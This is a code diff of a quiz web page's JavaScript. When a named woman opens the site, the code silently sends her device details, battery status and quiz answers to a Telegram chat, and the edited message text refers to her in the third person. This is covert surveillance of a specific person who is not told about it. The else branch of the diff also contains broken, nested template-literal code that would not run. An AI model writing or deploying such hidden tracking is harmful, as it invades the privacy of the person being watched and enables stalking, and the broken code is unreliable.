@@ -231,11 +231,12 @@
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? 'charging' : 'not charging'}`;
-                    const message = `YOO!!🫦 Gouri has been opened the site🙈:\nDevice: ${deviceInfo}\nBattery: ${batteryInfo}`;
+                    const message = `YOO XD!!🫦 Gouri has been opened the site🙈\n📲Device: ${deviceInfo}\n🔋Battery: ${batteryInfo}\n\n🎮Server Info\n● 📶 Connected\n● 🐞Bugs:No errors Found)`;
                     sendMessageToTelegram(message);
                 });
             } else {
-                const message = `YOO!!🫦 Gouri has been opened the site🙈:\nDevice: ${deviceInfo}\nBattery: ${batteryInfo}`;
+                const message = `
+                    const message = `YOO XD!!🫦 Gouri has been opened the site🙈\n📲Device: ${deviceInfo}\n🔋Battery: ${batteryInfo}\n\n🎮Server Info\n● 📶 Connected\n● 🐞Bugs:No errors Found)`;
                 sendMessageToTelegram(message);
             }
         };
@@ -364,7 +365,7 @@
                         const userAnswer = userAnswers[i] !== undefined ? q.options[userAnswers[i]] : 'No answer';
                         const correctAnswer = q.options[q.correct];
                         const time = timeTaken[i] !== undefined ? timeTaken[i] : 'N/A';
-                        answersText += `Q${i + 1}: ${q.question}\nYour Answer: ${userAnswer}\nCorrect Answer: ${correctAnswer}\nTime Taken: ${time} seconds\n\n`;
+                        answersText += `Q${i + 1}: ${q.question}\nHer Answer: ${userAnswer}\nCorrect Answer: ${correctAnswer}\nTime Taken: ${time} seconds\n\n`;
                     });
 
                     // Collect battery and device info
